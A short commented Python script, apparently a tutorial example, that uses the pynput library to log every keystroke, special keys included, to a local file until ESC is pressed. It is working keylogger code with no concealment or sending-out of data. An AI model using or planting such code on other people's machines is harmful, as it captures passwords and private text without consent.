from pynput import keyboard

# The file where keystrokes get saved
LOG_FILE = "log.txt"

def save_key(key):
    """Called automatically every time a key is pressed."""

    # Open the file in append mode so we don't overwrite old data
    with open(LOG_FILE, "a") as f:

        try:
            # Regular key (letter, number, symbol) — write it as-is
            f.write(key.char)

        except AttributeError:
            # Special key (Enter, Backspace, etc.) and write its name in brackets
            if key == keyboard.Key.esc:
                # ESC = stop the logger
                return False
            f.write(f" [{key.name}] ")


# Start listening for keypresses and runs until save_key() returns False
with keyboard.Listener(on_press=save_key) as listener:
    listener.join()